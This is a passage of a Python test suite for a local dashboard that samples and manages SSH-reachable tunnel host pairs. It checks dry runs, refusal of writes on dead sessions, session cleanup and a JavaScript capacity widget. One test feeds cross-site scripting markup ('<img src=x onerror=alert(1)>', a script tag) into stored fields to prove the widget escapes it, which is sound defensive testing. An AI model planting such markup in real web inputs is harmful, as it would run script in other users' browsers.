        stored = storage.latest_host_resources(94)
        self.assertEqual(stored["iran"]["host_role"], "iran")
        self.assertEqual(stored["foreign"]["host_role"], "foreign")
        self.assertEqual(stored["iran"]["ncpu"], 4)

        # A dry run asked to record still does not write, and still touches no host.
        dry = RecordingRunner(host_role="iran")
        out2 = engine.collect_pair_resources(pair, dry, RecordingRunner(host_role="foreign"),
                                             dry_run=True, record=True)
        self.assertEqual(dry.commands, [], "dry_run=True opened host reads")
        self.assertEqual(out2["recorded"], 0)
        self.assertEqual(len(rows_for(94)), 2, "the pair's rows grew from a preview")

        # One side unreadable: its row is stored as what it is, and the pair verdict says so.
        broken_ir = RecordingRunner(host_role="iran")
        broken_ir.state["resources"] = {"absent": ["memory", "disk", "boot_id", "uptime", "load",
                                                   "cpu_count"]}
        pair95 = dict(pair, id=95)
        out3 = engine.collect_pair_resources(pair95, broken_ir, RecordingRunner(host_role="foreign"),
                                             dry_run=False, record=True)
        self.assertFalse(out3["ok"], out3["summary"])
        stored = storage.latest_host_resources(95)
        self.assertIsNone(stored["iran"]["load1"], "an all-absent host was stored as a healthy reading")
        self.assertIn('"load": "absent"', stored["iran"]["source_states"])
        self.assertEqual(stored["foreign"]["load1"], 0.42,
                         "one host's failure changed the other host's row")

        # A live call with no session for one side is a named refusal, not an empty sample.
        out4 = engine.collect_pair_resources(pair, ir, None, dry_run=False, record=False)
        self.assertIn("no session", out4["hosts"]["foreign"]["summary"])
        self.assertIsNone(out4["hosts"]["foreign"]["row"])

        with storage.db_session() as conn:
            conn.execute("DELETE FROM host_resources WHERE pair_id IN (94, 95)")

    def test_95_a_dead_session_must_not_stream_a_file_either(self):
        """`SafeSSHRunner` refuses a dead session in two places, and the second strap had no witness.

        Round-063's re-run of `mutation_check_ssh_recovery.py` cut both guards and reported 42 of 43 caught:
        the read path refuses, the write path's refusal was not tested. That is the shape a belt-and-braces
        control takes when only one strap is checked, and the cost here is not a failed command - it is a
        half-streamed secret. `write_file` is how a REALITY private key, a chisel TLS key, a wstunnel CA key
        and an ESP SA key reach the host, each written to a child's stdin so the bytes never appear in argv.
        A session that died mid-stream leaves a file that reads as complete at the next `cat`, so the product
        would deploy against a key it believes it staged. Never re-issuing after a drop is the same rule the
        docstring at `mock_ssh.py:666` states for a different reason: half a config cannot be told from a
        whole one, so the only safe behaviour is to stop and say so.
        """
        class _Channel:
            def __init__(self, status=0):
                self.status, self.shutdowns = status, 0
            def recv_exit_status(self):
                return self.status
            def shutdown_write(self):
                self.shutdowns += 1

        class _Transport:
            """paramiko's transport shape, as far as `_session_gone()` looks at it: one boolean."""
            def __init__(self, active=True):
                self._active = active
            def is_active(self):
                return self._active

        class _Stream:
            def __init__(self, data=b"", status=0):
                self._buf, self.channel = io.BytesIO(data), _Channel(status)
                self.writes = []
            def write(self, chunk):
                self.writes.append(chunk)
            def flush(self):
                pass
            def read(self, n=-1):
                return self._buf.read(n)

        class _LiveClient:
            """A session that works, so the assertions below are about the guard and not about stubs."""
            def __init__(self, status=0):
                self.commands, self.status = [], status
                self.transport = _Transport()
            def get_transport(self):
                return self.transport
            def exec_command(self, cmd, timeout=30):
                self.stdin = _Stream()
                self.commands.append(cmd)
                return self.stdin, _Stream(b"", self.status), _Stream(b"", self.status)
            def close(self):
                pass

        dead = _LiveClient()
        dead.transport = None                      # the state a dropped link leaves the client in
        sent = []
        def _no_exec(cmd, timeout=30):
            sent.append(cmd)
            raise AssertionError("nothing may be sent on a session known to be dead")
        dead.exec_command = _no_exec
        runner = mock_ssh.SafeSSHRunner(dead, hostname="198.51.100.10",
                                        connector=lambda: self.fail("a refused write must not re-open a session"),
                                        sleep=lambda d: None)
        with self.assertRaises(mock_ssh.DeadSessionError) as ctx:
            runner.write_file("/etc/best-tunnel/privatekey.json", "PRIVATE-KEY-BODY")
        self.assertIn("nothing was sent", str(ctx.exception))
        self.assertEqual(sent, [], "the key never reached a shell on the far side")
        self.assertEqual(runner.reconnects, 0, "a write is never retried, so no session may be replaced")

        # The control's other half: a live session still writes, and still writes through stdin. Without
        # this the guard above would pass even if `write_file` refused every session.
        live = _LiveClient()
        mock_ssh.SafeSSHRunner(live, hostname="198.51.100.10", sleep=lambda d: None).write_file(
            "/etc/best-tunnel/privatekey.json", "PRIVATE-KEY-BODY")
        self.assertEqual(len(live.commands), 1, "a healthy session issues the write once")
        self.assertIn("/etc/best-tunnel/privatekey.json", live.commands[0])
        self.assertNotIn("PRIVATE-KEY-BODY", live.commands[0],
                         "the payload must travel on stdin, never in the command line")
        self.assertEqual(live.stdin.writes, ["PRIVATE-KEY-BODY"])
        self.assertEqual(live.stdin.channel.shutdowns, 1, "the writer closed the pipe, or cat waits forever")

        # A non-zero exit is a failure, not a silence: a staged file the host refused to write has to stop
        # a deploy that would otherwise believe its secret is in place.
        broken = _LiveClient(status=1)
        with self.assertRaises(RuntimeError) as ctx2:
            mock_ssh.SafeSSHRunner(broken, hostname="198.51.100.10",
                                   sleep=lambda d: None).write_file("/etc/best-tunnel/x", "body")
    def _get_api(self, client_ip: str = "127.0.0.96") -> dict:
        """Drives dashboard.H.do_GET for /api, the way test_16 drives do_POST.

        A distinct client IP on purpose: /api is rate limited per (ip, category) and the shared
        127.0.0.1 bucket is already half-spent by the rest of this suite, so reading from the default
        address would make this test's outcome depend on which test happened to run before it.
        """
        class MockGet:
            def __init__(self):
                self.headers = {"Host": "127.0.0.1:8800"}
                self.path = "/api"
                self.client_address = (client_ip, 51296)
                self.wfile = io.BytesIO()
                self.response_code = None

            def send_response(self, code): self.response_code = code
            def send_header(self, k, v): pass
            def end_headers(self): pass

        handler = MockGet()
        dashboard.H.do_GET(handler)
        return {"code": handler.response_code,
                "body": json.loads(handler.wfile.getvalue().decode("utf-8"))}

    def _clear_mutation_bucket(self):
        """POST routes share one (ip, category) bucket; this test must neither depend on the earlier
        tests nor be the one that pushes the next test over the limit."""
        with dashboard.RATE_LIMIT_LOCK:
            dashboard.RATE_LIMIT_BUCKETS.pop(("127.0.0.1", "mutation"), None)
        self.addCleanup(dashboard.RATE_LIMIT_BUCKETS.pop, ("127.0.0.1", "mutation"), None)

    def test_96_the_capacity_panel_is_fed_by_the_api_and_a_preview_records_nothing(self):
        """#69 Acceptance Test (round 063 ruling 1): the two HTTP entry points the panel uses, end to end.

        test_94 proved the engine half - what a sample contains and when it may be written. This drives
        `do_GET` and `do_POST` themselves, because the defect class a panel adds is wiring, not arithmetic:
        a route that samples but forgets to `record` leaves the panel showing last round's numbers, a dry
        run that records makes a preview look like a measurement, a payload with no `collected_at` gives
        the age nothing to age against, and a second host that will not connect leaks the first host's
        session because the closer is never reached.

        The last one is why the runner-creation block is inside the try: `pair_for_operations` builds both
        specs, and the shape this file used to ship in `/api/preflight` and `/api/failover/check` opened
        them one after the other *before* the try. That finding was fixed in the same round and is proven
        by test_98 rather than left as a comment.
        """
        ir, fr = "198.51.100.10", "203.0.113.20"
        pid = storage.add_pair(name=f"capacity_{int(time.time() * 1000)}", iran_host=ir,
                               foreign_host=fr, frontend_port=443)
        self.addCleanup(storage.delete_pair, pid)
        names = [n for n, _ in engine.RESOURCE_SAMPLE_COMMANDS]
        cmds = [c for _, c in engine.RESOURCE_SAMPLE_COMMANDS]

        def pair_row(body):
            return next(p for p in body["pairs"] if p["id"] == pid)

        # ---- 1. Never sampled: both roles present as None, and a clock the ages can be measured against.
        body = self._get_api()["body"]
        fresh = pair_row(body)
        self.assertEqual(fresh["resources"], {"iran": None, "foreign": None},
                         "a host nobody has sampled must read as absent, not as a row of zeros")
        self.assertEqual(body["resource_stale_after_sec"], engine.RESOURCE_STALE_AFTER_SEC)
        self.assertTrue(60 <= engine.RESOURCE_STALE_AFTER_SEC <= 900,
                        f"the freshness policy is {engine.RESOURCE_STALE_AFTER_SEC}s: either a rounding "
                        f"error or a day, and neither is a policy anyone chose")
        self.assertAlmostEqual(body["server_time"], time.time(), delta=5.0,
                               msg="without a server stamp the browser clock decides freshness, and a "
                                   "laptop an hour fast makes a stale sample look current")

        # ---- 2. One host sampled: the newest row is carried, the other stays None, NULL stays NULL.
        storage.record_host_resources({"pair_id": pid, "host_role": "iran", "load1": 0.5, "ncpu": 2,
                                        "load1_per_core_pct": 25.0, "mem_used_pct": None,
                                        "disk_used_pct": None, "uptime_sec": 90.0, "boot_id": "",
                                        "disk_fullest_mount": "/mnt/" + fr,
                                        "source_states": {"load": "measured", "memory": "absent"}})
        got = pair_row(self._get_api()["body"])["resources"]
        self.assertEqual(got["iran"]["load1"], 0.5)
        self.assertIsNone(got["iran"]["mem_used_pct"], "the payload turned an unreadable sensor into a 0")
        self.assertIsNone(got["foreign"], "the sampled host's row leaked into its peer's slot")
        blob = json.dumps(got, ensure_ascii=False)
        self.assertEqual(re.findall(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", blob), [],
                         f"the capacity subtree carried an address: {blob[:200]}")

        # ---- 3. The route's own shape, pinned where a wrong literal is invisible to every other test.
        post_src = inspect.getsource(dashboard.H.do_POST)
        self.assertIn('self.path == "/api/resources"', post_src)
        seg = post_src.split('self.path == "/api/resources"')[1].split("elif self.path")[0]
        self.assertIn("engine.collect_pair_resources", seg)
        self.assertIn("dry_run=dry, record=True", seg,
                      "the dashboard samples without recording, so the panel can never show a new number")
        self.assertIn("mask_tree", seg, "the capacity response leaves this process unmasked")
        self.assertIn("storage.latest_host_resources(pair_id)", seg,
                      "the response carries the sample rather than what is stored, so a refused write "
                      "would still be shown as recorded")
        self.assertNotIn("try_acquire_host_locks", seg,
                         "capacity sampling is a read; taking the host lock would make the panel contend "
                         "with the very operations it exists to observe (a deliberate decision - if this "
                         "changes, change the comment in dashboard.py too)")

        # ---- 4. Dry run: the whole panel must stay a preview, at the HTTP layer as well as in the engine.
        self.assertTrue(dashboard.is_dry_run(), "This suite must never drive a live SSH session")
        before = storage.host_resource_history(pid)
        self._clear_mutation_bucket()
        resp = self._post_api("/api/resources", {"id": pid})
        self.assertEqual(resp["body"].get("dry_run"), True)
        self.assertEqual(resp["body"].get("recorded"), 0)
        self.assertEqual(storage.host_resource_history(pid), before,
                         "a dry run persisted capacity rows for hosts it never touched")
        self.assertIn("DRY_RUN", resp["body"].get("summary", ""))
        # The refusal is a 400 by this file's own convention - /api/preflight answers the same way for a
        # preview, because `ok` means "every source was usable" and a preview used none. The panel reads
        # the `dry_run` flag, not the status.
        self.assertEqual(resp["code"], 400)
        self.assertEqual(resp["body"]["resources"]["iran"]["load1"], 0.5,
                         "a preview blanked the table the operator was already looking at")

        # ---- 5. Live path, driven through the route with mocked sessions.
        closed, opened, runners = [], [], []

        class SealedRunner(RecordingRunner):
            def close(self):
                closed.append(self.host_role)
                return super().close()

        def factory(spec, dry_run=True, host_role="", blank_iran=False):
            opened.append((spec.get("host"), dry_run, host_role))
            r = SealedRunner(host_role=host_role)
            if blank_iran and host_role == "iran":
                r.state["resources"] = {"absent": names}
            runners.append(r)
            return r

        real_dry, real_factory = dashboard.is_dry_run, dashboard.get_ssh_runner
        try:
            dashboard.is_dry_run = lambda: False
            dashboard.get_ssh_runner = factory
            self._clear_mutation_bucket()
            resp = self._post_api("/api/resources", {"id": pid})
        finally:
            dashboard.is_dry_run, dashboard.get_ssh_runner = real_dry, real_factory

        self.assertEqual(resp["code"], 200, resp["body"])
        self.assertTrue(resp["body"].get("ok"), resp["body"].get("summary"))
        self.assertEqual(resp["body"].get("recorded"), 2, "only one host's sample reached the database")
        self.assertEqual([o[2] for o in opened], ["iran", "foreign"],
                         f"a side was sampled twice or not at all: {opened}")
        self.assertEqual([o[1] for o in opened], [False, False],
                         "the route handed a runner dry_run=True while claiming to sample for real")
        self.assertEqual(sorted(closed), ["foreign", "iran"], "a capacity session was left open")
        for r in runners:
            self.assertEqual(len(r.commands), len(names),
                             f"{r.host_role}: the route read {len(r.commands)} sources, not {len(names)}")
            self.assertEqual([c for c in r.commands if c in cmds], cmds,
                             "the route issued a command the sampler did not declare, so the read-only "
                             "proof does not cover it")
        stored = storage.latest_host_resources(pid)
        self.assertEqual(stored["iran"]["ncpu"], 4)
        self.assertEqual(stored["foreign"]["load1"], 0.42)
        self.assertIn('"load": "measured"', stored["iran"]["source_states"])

        # ---- 6. One host unreadable: the verdict is negative, the rows are still stored and still NULL.
        # A panel that showed nothing when one sensor failed would be an argument for sampling less.
        runners, opened, closed = [], [], []
        try:
            dashboard.is_dry_run = lambda: False
            dashboard.get_ssh_runner = lambda spec, dry_run=True, host_role="": factory(
                spec, dry_run=dry_run, host_role=host_role, blank_iran=True)
            self._clear_mutation_bucket()
            resp = self._post_api("/api/resources", {"id": pid})
        finally:
            dashboard.is_dry_run, dashboard.get_ssh_runner = real_dry, real_factory
        self.assertEqual(resp["code"], 400, "an all-absent host was reported as a healthy sample")
        self.assertFalse(resp["body"].get("ok"))
        self.assertEqual(resp["body"].get("recorded"), 2)
        stored = storage.latest_host_resources(pid)
        self.assertIsNone(stored["iran"]["load1"], "an unreadable host was stored as a reading of zero")
        self.assertIn('"load": "absent"', stored["iran"]["source_states"])
        self.assertEqual(stored["foreign"]["load1"], 0.42, "one host's failure changed the other's row")

        # ---- 7. A second host that will not connect must not strand the first host's session.
        runners, opened, closed = [], [], []

        def half_factory(spec, dry_run=True, host_role=""):
            opened.append(host_role)
            if host_role == "foreign":
                raise RuntimeError("could not connect")
            r = SealedRunner(host_role=host_role)
            runners.append(r)
            return r

        try:
            dashboard.is_dry_run = lambda: False
            dashboard.get_ssh_runner = half_factory
            self._clear_mutation_bucket()
            resp = self._post_api("/api/resources", {"id": pid})
        finally:
            dashboard.is_dry_run, dashboard.get_ssh_runner = real_dry, real_factory
        self.assertFalse(resp["body"].get("ok"))
        self.assertIn("could not connect", resp["body"].get("error", ""))
        self.assertEqual(closed, ["iran"], "the refusal lost the session that had already been opened")

        # ---- 8. An unknown pair is a named refusal, and no host is touched for it.
        self._clear_mutation_bucket()
        resp = self._post_api("/api/resources", {"id": 999999})
        self.assertEqual(resp["code"], 400)
        self.assertIn("does not exist", resp["body"].get("error", ""))

        # ---- 9. The widget is wired: payload, containers, renderer, button, and both call sites.
        page = dashboard.PAGE
        self.assertIn('id="resourceHosts"', page)
        self.assertIn('id="resourceSummary"', page)
        self.assertIn('id="sampleBtn"', page)
        self.assertIn("onclick=\"sampleResources()\"", page)
        self.assertIn("function resourceHtml(p, staleAfterSec, nowSec)", page)
        self.assertIn("apiFetch('/api/resources'", page)
        self.assertIn("renderBenchmarks(p);\n        renderCarrierRule(p);\n        renderBackendRule(p);\n        renderResources(p);",
                      page, "the renderer exists but is never called, which is a widget that is always empty")
        self.assertIn("renderResources(null)", page,
                      "a cleared form must drop the previous pair's numbers, not keep showing them")
        # The pin above has to be able to fail: cut the call site and the exact-string assert goes red.
        self.assertNotIn("renderBenchmarks(p);\n        renderCarrierRule(p);\n        renderBackendRule(p);\n        renderResources(p);",
                         page.replace("renderResources(p);", "", 1),
                         "the call-site pin is satisfied by any page that contains the words")
        for needle in ("resource_stale_after_sec", "server_time"):
            self.assertIn(needle, page, f"loadData never reads `{needle}`, so the freshness policy is a "
                                        f"server value no client uses")
        self.assertNotIn("|| 180", page, "the page invented a freshness policy of its own instead of "
                                        "reading the one the server publishes")

        # ---- 10. Ruling 2: this panel is the local dashboard's own surface, and nothing reaches out.
        self.assertEqual(re.findall(r"[Tt]elegram|webhook", page + post_src), [],
                         "an outbound monitoring channel appeared in the shipped page or in the POST routes")

        with storage.db_session() as conn:
            conn.execute("DELETE FROM host_resources WHERE pair_id = ?", (pid,))
        self.assertEqual(storage.host_resource_history(pid), [], "the cleanup left capacity rows behind")

    def _capacity_js(self, resource_src: str, entry: str = "resourceHtml") -> str:
        """The renderer plus its dependencies, assembled as a runnable node script.

        Each `const RESOURCE_*` is read to its terminating `;` rather than taken as one line, because the
        sampler now has nine sources and the list wraps. A line-based extraction silently handed node a
        `const RESOURCE_SOURCES = [... ,` with no closing bracket - a harness that goes red on correct code
        is not a control, and this one did (the first run after #70 landed failed on the extraction, not on
        the renderer).

        `entry` is the function under test and `c.p` is its first argument whatever it is - a pair row for
        `resourceHtml`, an attribution object for `attributionHtml`. Both renderers take the freshness policy
        and the server clock as their second and third arguments, which is what lets one driver serve both.
        """
        lines = dashboard.PAGE.splitlines()
        consts = []
        for i, ln in enumerate(lines):
            if not ln.strip().startswith("const RESOURCE_"):
                continue
            block, j = [], i
            while j < len(lines):
                block.append(lines[j].strip())
                if lines[j].rstrip().endswith(";"):
                    break
                j += 1
            else:
                self.fail(f"const at page line {i} never terminates with ';'")
            self.assertTrue(lines[j].rstrip().endswith(";"), f"unterminated const: {block}")
            consts.append(" ".join(block) if len(block) > 1 else block[0])
        self.assertEqual(len(consts), 3, f"expected three RESOURCE_ consts on the page, found {consts}")
        joined = "\n".join(consts)
        for name, _cmd in engine.RESOURCE_SAMPLE_COMMANDS:
            self.assertIn(f"'{name}'", joined,
                          f"the page's source list handed to node omits {name!r}, so a renderer mutation "
                          f"could pass while the widget never saw the new source")
        return (joined + "\n"
                + self._js_source("function escapeHtml(s) {") + "\n"
                + resource_src + "\n"
                + "const cases = JSON.parse(process.argv[2]);\n"
                + f"process.stdout.write(JSON.stringify(cases.map(c => {entry}(c.p, c.limit, c.now))));\n")

    def test_97_the_capacity_widget_keeps_an_unreadable_sensor_unreadable(self):
        """#69 Acceptance Test: the renderer is executed against stored rows, not string-pinned.

        The whole point of this panel is the NULL-vs-zero discipline ruling 1 was written to get: an
        unreadable memory sensor and an idle machine must not look the same. That distinction lives in a
        JavaScript function, so it is tested by running it - on a row of real numbers, on a row of NULLs,
        on a row whose every sensor legitimately reads zero, on a stale row, on a row with no server clock
        to age it against, and on rows whose free text (a mount path, a boot id) carries markup.

        Then each claim is mutated. A renderer that never disagrees with anything is a function that prints
        whatever the row contains, and this round's panel is exactly the kind of surface where that reads as
        an healthy host.
        """
        node = shutil.which("node")
        if not node:
            print("    [test_97] node is not installed: the capacity widget is string-pinned only")
            return
        names = [n for n, _ in engine.RESOURCE_SAMPLE_COMMANDS]
        # Quoted-name extraction rather than a split on ",": the array is wrapped onto two lines now that
        # the sampler has nine sources, and `split(",")` handed back "\ntcp" - a red the *test* caused. A
        # pin that goes red when the code it checks is correct is not a control, so the extraction reads
        # the names and leaves the formatting alone. It still drifts red on a real mismatch (proved below).
        self.assertEqual(
            re.findall(r"'([^']+)'", re.search(r"const RESOURCE_SOURCES = \[([^\]]*)\];",
                                               dashboard.PAGE).group(1)),
            names,
            "the widget's source list drifted from the sampler's, so a source the engine stopped reading "
            "would still be reported here as missing (or the reverse)")

        NOW = 1000000.0

        def row(**kw):
            base = {"id": 7, "pair_id": 7, "host_role": "iran", "collected_at": NOW - 10.0,
                    "load1": 0.42, "load5": 0.31, "load15": 0.20, "ncpu": 4,
                    "load1_per_core_pct": 10.5, "mem_total_kb": 3883264, "mem_available_kb": 1043264,
                    "mem_used_pct": 73.1, "swap_total_kb": 0, "swap_free_kb": 0,
                    "disk_total_kb": 41052824, "disk_used_kb": 7410280, "disk_avail_kb": 31522076,
                    "disk_used_pct": 18.1, "disk_fullest_mount": "/var", "disk_fullest_used_pct": 14.0,
                    "uptime_sec": 123456.78, "boot_id": "3f2a1b4c-5d6e-7f80-91a2-b3c4d5e6f708",
                    "source_states": json.dumps({n: "measured" for n in names}, sort_keys=True)}
            base.update(kw)
            return base

        def pair(res):
            return {"id": 7, "name": "cap", "iran_host": "198.51.100.10",
                    "foreign_host": "203.0.113.20", "resources": res}

        cases = [
            {"p": None, "limit": 180, "now": NOW},                                        # 0
            {"p": pair({"iran": row(), "foreign": row(host_role="foreign")}),
             "limit": 180, "now": NOW},                                                   # 1 healthy both
            {"p": pair({"iran": row(load1=None, ncpu=None, load1_per_core_pct=None,
                                    mem_total_kb=None, mem_available_kb=None, mem_used_pct=None,
                                    swap_total_kb=None, swap_free_kb=None, disk_total_kb=None,
                                    disk_used_kb=None, disk_avail_kb=None, disk_used_pct=None,
                                    disk_fullest_mount="", disk_fullest_used_pct=None,
                                    uptime_sec=None, boot_id="",
                                    source_states=json.dumps({n: "absent" for n in names}))}),
             "limit": 180, "now": NOW},                                                   # 2 all unreadable
            {"p": pair({"iran": row(load1=0.0, load1_per_core_pct=0.0, mem_used_pct=0.0,
                                    mem_available_kb=3883264, disk_used_pct=0.0,
                                    disk_avail_kb=41052824, disk_fullest_used_pct=0.0,
                                    uptime_sec=0.0)}), "limit": 180, "now": NOW},         # 3 measured zeros
            {"p": pair({"iran": row(collected_at=NOW - 5000.0)}), "limit": 180, "now": NOW},  # 4 stale
            {"p": pair({"iran": row()}), "limit": 180, "now": None},                       # 5 no clock
            {"p": pair({"iran": row()}), "limit": None, "now": NOW},                       # 6 no policy
            {"p": pair({"iran": None, "foreign": None}), "limit": 180, "now": NOW},        # 7 never sampled
            {"p": pair({"iran": row(disk_fullest_mount='<img src=x onerror=alert(1)>',
                                    boot_id="<script>bad()</script>",
                                    source_states='{"load": "<b>me</b>"}')}),
             "limit": 180, "now": NOW},                                                   # 8 injected text
            {"p": pair({"iran": row(source_states="{not json at all")}), "limit": 180, "now": NOW},  # 9
            {"p": pair({"iran": row(source_states=json.dumps({"load": "measured"}))}),
             "limit": 180, "now": NOW},                                                   # 10 missing keys
            {"p": pair({"iran": row(load1_per_core_pct=140.0, disk_used_pct=93.0,
                                    disk_fullest_mount="/var", disk_fullest_used_pct=97.0,
                                    mem_used_pct=96.0)}), "limit": 180, "now": NOW},      # 11 hot, fresh
            {"p": pair({"iran": row(collected_at=NOW - 9000.0, load1_per_core_pct=140.0)}),
             "limit": 180, "now": NOW},                                                   # 12 hot, stale
        ]

        base_src = self._js_source("function resourceHtml(p, staleAfterSec, nowSec) {")
        driver = self._capacity_js(base_src)

        def run(js_src, strict=True):
            path = os.path.join(tempfile.mkdtemp(), "capacity_widget.js")
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(js_src)
            proc = subprocess.run([node, path, json.dumps(cases, ensure_ascii=False)],
                                  capture_output=True, encoding="utf-8", timeout=120)
            if proc.returncode != 0:
                # A renderer that cannot render at all is caught by the first claim it breaks; the
                # baseline run is the one that has to parse.
                self.assertFalse(strict, f"node failed: {proc.stderr[:500]}")
                return None
            return json.loads(proc.stdout)

        # Each claim is a thing the panel must state; a claim list is what makes a mutation decidable.
        claims = [
            ("an unsaved form states that it holds no pair",
             lambda s: "این فرم جفت ذخیره‌شده‌ای نیست" in s[0] and "منابع غیرکامل" not in s[0]),
            # The count is derived from the source list, so the claim is written the same way: hard-coding
            # "شش" here would have gone red the moment the sampler grew three sources, which is a pin on a
            # word rather than on the behaviour ("every source the sampler declares is accounted for").
            ("a full sample reports every source read, for both hosts",
             lambda s: (s[1].count(f"هر {len(names)} منبع خوانده شدند") == 2
                        and "منابع غیرکامل" not in s[1]
                        and "ایران" in s[1] and "خارج" in s[1])),
            ("the numbers themselves are shown",
             lambda s: "10.5٪" in s[1] and "73.1٪" in s[1] and "18.1٪" in s[1]
                       and "1 روز و 10 ساعت" in s[1] and "swap: ندارد" in s[1]),
            ("a fresh sample is labelled fresh",
             lambda s: "تازه" in s[1] and "کهنه" not in s[1]),
            ("an unreadable sensor gets the not-read label, never a number",
             lambda s: s[2].count("خوانده نشد") >= 4 and "٪" not in s[2]),
            ("and it is reported as an unusable source, not as silence",
             lambda s: "منابع غیرکامل" in s[2] and "memory=absent" in s[2]),
            ("a measured zero is still a zero",
             lambda s: "0.0٪" in s[3] and "خوانده نشد" not in s[3] and "0 ثانیه" in s[3]),
            ("a sample past the policy is stale and says so",
             lambda s: "کهنه" in s[4] and "تازه" not in s[4]),
            ("no server clock means no freshness claim",
             lambda s: "سن نامشخص" in s[5] and "تازه" not in s[5]),
            ("no policy means no freshness claim either",
             lambda s: "سن نامشخص" in s[6] and "تازه" not in s[6]),
            ("a host that was never sampled is named as never sampled",
             lambda s: s[7].count("هنوز نمونه‌ای از این میزبان ثبت نشده") == 2
                       and "برای انتساب رگبار" in s[7]),
            ("free text is escaped",
             lambda s: "<img" not in s[8] and "&lt;img" in s[8] and "<script>" not in s[8]
                       and "&lt;b&gt;" in s[8]),
            ("a source_states that is not JSON is unread, not 'all good'",
             lambda s: "وضعیت منابع" in s[9] and f"هر {len(names)} منبع خوانده شدند" not in s[9]),
            ("a source with no record is reported as no-record",
             lambda s: "no-record" in s[10] and "memory=no-record" in s[10]),
            ("a hot host is attributed by name and by sensor",
             lambda s: "انتساب رگبار" in s[11] and "CPU" in s[11] and "دیسک /var" in s[11]
                       and "بر پایه نمونه کهنه" not in s[11] and "حافظه" in s[11]),
            ("a hot host on a stale sample is attributed as stale",
             lambda s: "انتساب رگبار" in s[12] and "بر پایه نمونه کهنه" in s[12]),
            ("the widget never echoes a host address",
             lambda s: all("198.51.100.10" not in o and "203.0.113.20" not in o for o in s)),
            ("and never renders an IPv4 shape at all",
             lambda s: not re.findall(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", "".join(s))),
        ]
        shown = run(driver)
        self.assertEqual(len(shown), len(cases))
        for why, ok in claims:
            self.assertTrue(ok(shown), f"the widget broke its own rule: {why}")

        mutations = [
            ("NULL rendered as 0 (the collapse ruling 1 was written against)",
             base_src.replace("? null : Number(x);", "? 0 : Number(x);")),
            ("the staleness rule removed, so every age reads as fresh",
             base_src.replace("stale = age > limit;", "stale = false;")),
            ("mount paths injected raw",
             base_src.replace("escapeHtml(mount)", "mount")),
            ("per-source verdicts skipped",
             base_src.replace("if (st !== 'measured' && st !== 'partial')", "if (false)")),
            ("the CPU threshold moved out of reach, so a saturated host reads as idle",
             base_src.replace("perCore >= 90) hot.push('CPU')", "perCore >= 1e9) hot.push('CPU')")),
            ("an unknown clock treated as fresh",
             base_src.replace("if (now === null || collected === null || limit === null) {",
                              "if (false) {")),
            ("the never-sampled branch reporting zeros instead",
             base_src.replace("if (!row) {", "if (false) {")),
        ]
        for name, src in mutations:
            self.assertNotEqual(src, base_src, f"mutation {name!r} did not change the renderer")
            got = run(self._capacity_js(src), strict=False)
            broken = (["the renderer could not produce output at all"] if got is None
                      else [why for why, ok in claims if not ok(got)])
            self.assertTrue(broken, f"mutation {name!r} passed every claim - the widget is not being "
                                    f"watched by this test")

    def test_98_no_dashboard_route_that_opens_a_session_can_leave_one_open(self):
        """#71 Acceptance Test (round 063 ruling 3): the closers run even when opening fails.

        `/api/preflight` and `/api/failover/check` built both SSH sessions *before* the `try` whose
        `finally` closes them. A pair whose foreign host is unreachable therefore raised past the closer,
        and the session that had already been authenticated to the Iranian host stayed open for the life of
        the dashboard process - one stranded socket per clicked button, on a page whose refresh loop means
        an operator under an outage clicks repeatedly. The manager authorised the fix for exactly these two
        routes; `/api/resources` already had the shape (test_96 section 7), so this test census-covers all
        three and pins the two that changed.

        Deliberately not changed here, and recorded rather than fixed silently:
        `failover.py:359-364` (perform_failover) has the same ordering. Its `finally` at 567 is keyed on
        `created_ir`/`created_fr`, and moving the two opens inside its `try` would also move them under
        that block's exception handling, which converts a connection failure into a `success: False`
        result body instead of letting it reach the route handler. That is a behaviour change on the live
        switchover path, one nobody has ruled on, so it is reported as an open finding instead of being
        bundled into an authorised read-path fix.
        """
        ir, fr = "198.51.100.10", "203.0.113.20"
        pid = storage.add_pair(name=f"sessions_{int(time.time() * 1000)}", iran_host=ir,
                               foreign_host=fr, frontend_port=443)
        self.addCleanup(storage.delete_pair, pid)
        # /api/failover/check refuses a pair with no recorded active_tunnel, and refusing before opening
        # anything would let a test that expects a close pass without ever reaching the closers.
        storage.update_pair_status(pid, status="ACTIVE", active_tunnel="GRE")

        closed, opened = [], []

        class SealedRunner(RecordingRunner):
            def close(self):
                closed.append(self.host_role)
                return super().close()

        def make_runner(host_role, fail_on=None):
            opened.append(host_role)
            if host_role == fail_on:
                raise RuntimeError("could not connect")
            return SealedRunner(host_role=host_role)

        def drive(path, fail_on=None, live=False):
            """One POST through the real handler, with the dashboard's own opener replaced."""
            del closed[:]
            del opened[:]

            def factory(spec, dry_run=True, host_role=""):
                return make_runner(host_role, fail_on)

            real_dry, real_factory = dashboard.is_dry_run, dashboard.get_ssh_runner
            try:
                if live:
                    dashboard.is_dry_run = lambda: False
                dashboard.get_ssh_runner = factory
                self._clear_mutation_bucket()
                return self._post_api(path, {"id": pid})
            finally:
                dashboard.is_dry_run, dashboard.get_ssh_runner = real_dry, real_factory

        # ---- 1. The control: the old ordering really does strand a session, and the counter can see it.
        # Without this, "closed == ['iran']" only proves the new code closes; it would also be true of a
        # test that never exercised the failure. Both shapes run against the same counter.
        def old_shape(fail_on):
            ir_runner = fr_runner = None
            try:
                ir_runner = make_runner("iran", fail_on)
                fr_runner = make_runner("foreign", fail_on)
                try:
                    return "measured"
                finally:
                    for r in (ir_runner, fr_runner):
                        if hasattr(r, "close"):
                            r.close()
            except Exception as ex:
                return f"caught: {ex}"

        def new_shape(fail_on):
            ir_runner = fr_runner = None
            try:
                ir_runner = make_runner("iran", fail_on)
                fr_runner = make_runner("foreign", fail_on)
                return "measured"
            except Exception as ex:
                return f"caught: {ex}"
            finally:
                for r in (ir_runner, fr_runner):
                    if hasattr(r, "close"):
                        r.close()

        del closed[:]
        del opened[:]
        self.assertEqual(old_shape("foreign"), "caught: could not connect")
        self.assertEqual(opened, ["iran", "foreign"])
        self.assertEqual(closed, [], "the control says the old ordering leaks; if this assert goes red "
                                    "the instrument no longer distinguishes the two shapes and every "
                                    "assertion below is decoration")

        del closed[:]
        del opened[:]
        self.assertEqual(new_shape("foreign"), "caught: could not connect")
        self.assertEqual(closed, ["iran"], "the proposed ordering does not close what it opened either")

        # ---- 2. /api/preflight, driven through `do_POST` with mocked sessions.
        # Both hosts reachable: each session closed, and closed exactly once.
        resp = drive("/api/preflight", live=True)
